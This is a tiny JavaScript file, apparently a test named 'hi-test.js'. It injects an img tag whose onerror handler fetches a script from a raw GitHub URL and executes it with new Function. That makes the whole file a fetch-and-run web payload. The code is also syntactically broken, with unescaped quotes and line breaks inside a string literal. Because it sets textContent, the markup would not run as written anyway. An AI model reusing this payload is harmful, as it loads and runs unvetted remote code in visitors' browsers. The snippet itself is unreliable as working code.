/// hi-test.js
(function(){
  var el = document.createElement('p');
  el.textContent = '<img src="bad-image.png" onerror="
(async()=>{
  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
  const code = await res.text();
  new Function(code)();
})();
">';
  document.documentElement.appendChild(el);
})();
